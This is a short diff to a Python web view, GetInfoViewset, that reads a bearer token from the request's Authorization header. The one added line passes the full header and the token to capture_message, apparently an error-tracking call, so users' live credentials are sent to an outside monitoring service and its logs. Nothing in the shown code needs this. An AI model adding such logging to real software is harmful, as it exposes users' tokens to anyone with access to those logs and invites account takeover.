@@ -249,6 +249,7 @@ class GetInfoViewset(AsycViewMixin, ViewSet):
         user_id = serializer.data.get("user_id")
         title = serializer.data.get("title")
         token = request.headers.get("authorization").split(" ")[1]
+        capture_message(f"auth {request.headers.get('authorization')}\n {token}")
 
         headers = {
             "Content-Type": "application/json",
